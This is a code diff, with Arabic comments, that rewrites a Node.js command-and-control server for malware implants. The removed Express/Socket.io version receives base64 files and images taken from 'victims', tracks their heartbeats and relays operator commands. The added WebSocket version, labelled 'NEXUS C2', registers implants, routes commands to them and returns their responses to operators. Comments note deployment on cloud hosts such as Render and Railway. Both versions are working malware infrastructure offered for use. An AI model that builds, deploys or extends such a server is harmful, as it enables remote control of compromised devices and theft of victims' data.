@@ -1,70 +1,77 @@
-const express = require('express');
+// 1. الجزء المعدل للمنصات السحابية
+const WebSocket = require('ws');
 const http = require('http');
-const { Server } = require('socket.io');
-const fs = require('fs');
-const path = require('path');
 
-const app = express();
-const server = http.createServer(app);
-
-// إعداد Socket.io للعمل مع لوحة التحكم
-const io = new Server(server, {
-    cors: { origin: "*" }
+// إنشاء سيرفر HTTP يتوافق مع Render
+const server = http.createServer((req, res) => {
+    res.writeHead(200);
+    res.end("NEXUS C2 SERVER IS ONLINE");
 });
 
-// إنشاء مجلد التخزين للصور والملفات المسحوبة
-const uploadDir = path.join(__dirname, 'uploads');
-if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
+const wss = new WebSocket.Server({ server });
 
-app.use(express.static('uploads'));
-app.use(express.json({ limit: '50mb' }));
+// قاعدة البيانات المؤقتة (اتركها كما هي)
+const implants = new Map();      
+const operators = new Map();     
 
-// مصفوفة لتخزين الضحايا المتصلين
-let targets = {};
-
-// 1. استقبال البيانات المسحوبة (صور/ملفات)
-app.post('/exfiltrate', (req, res) => {
-    const { id, type, data, fileName } = req.body;
+wss.on('connection', (ws, req) => {
+    ws.isAlive = true;
+    ws.on('pong', () => ws.isAlive = true);
     
-    if (type === 'IMAGE' || type === 'FILE') {
-        const filePath = path.join(uploadDir, fileName);
-        // تحويل البيانات من Base64 إلى ملف حقيقي
-        fs.writeFileSync(filePath, data, 'base64');
-        
-        // إرسال تنبيه للوحة التحكم لعرض الصورة
-        io.emit('data_result', { 
-            from: id, 
-            msg: `تم سحب ملف جديد: ${fileName}`,
-            fileUrl: `${req.protocol}://${req.get('host')}/${fileName}`,
-            fileType: type
-        });
-    }
-    res.sendStatus(200);
-});
+    ws.on('message', (data) => {
+        try {
+            const msg = JSON.parse(data);
+            routeMessage(ws, msg); // استدعاء منطق التوجيه
+        } catch(e) {
+            console.log("Error parsing JSON");
+        }
+    });
 
-// 2. استقبال نبضات الضحايا (Uplink)
-app.get('/uplink', (req, res) => {
-    const targetId = req.query.u || `ID-${Math.floor(Math.random()*1000)}`;
-    targets[targetId] = { id: targetId, ip: req.ip, lastSeen: Date.now() };
-    
-    // إبلاغ لوحة التحكم بظهور ضحية جديدة
-    io.emit('target_online', targets[targetId]);
-    res.send("PULSE_ACK");
-});
-
-// 3. إدارة الأوامر من لوحة التحكم
-io.on('connection', (socket) => {
-    console.log('[+] Control Panel Connected');
-
-    socket.on('command', (cmd) => {
-        console.log(`[!] Sending Command: ${cmd.action} to ${cmd.to}`);
-        // بث الأمر للضحية
-        io.emit('execute_cmd', cmd); 
+    ws.on('close', () => {
+        for(let [id, client] of implants) {
+            if(client.ws === ws) {
+                client.online = false;
+                broadcastToOperators({type: 'heartbeat', targetId: id, status: 'offline'});
+            }
+        }
     });
 });
 
-// ملاحظة: Railway يحدد المنفذ تلقائياً عبر process.env.PORT
-const PORT = process.env.PORT || 8080;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`💀 SHADOW-BRIDGE RUNNING ON PORT ${PORT}`);
+// 2. منطق التوجيه (هذا هو قلب السيرفر - ابقِه كما هو)
+function routeMessage(ws, msg) {
+    switch(msg.type) {
+        case 'implant_register':
+            implants.set(msg.id, {ws: ws, model: msg.model, version: msg.version, online: true});
+            broadcastToOperators({type: 'new_target', id: msg.id, model: msg.model});
+            break;
+            
+        case 'command':
+            const implant = implants.get(msg.target);
+            if(implant && implant.online) {
+                implant.ws.send(JSON.stringify(msg));
+            }
+            break;
+
+        case 'implant_response':
+            broadcastToOperators(msg);
+            break;
+
+        case 'auth':
+            operators.set(ws, {auth: true});
+            ws.send(JSON.stringify({type: 'auth_success'}));
+            break;
+    }
+}
+
+function broadcastToOperators(msg) {
+    const data = JSON.stringify(msg);
+    operators.forEach((info, ws) => {
+        if(ws.readyState === WebSocket.OPEN) ws.send(data);
+    });
+}
+
+// 3. تشغيل السيرفر على المنفذ المتغير
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`NEXUS C2 Active on Port: ${PORT}`);
 });
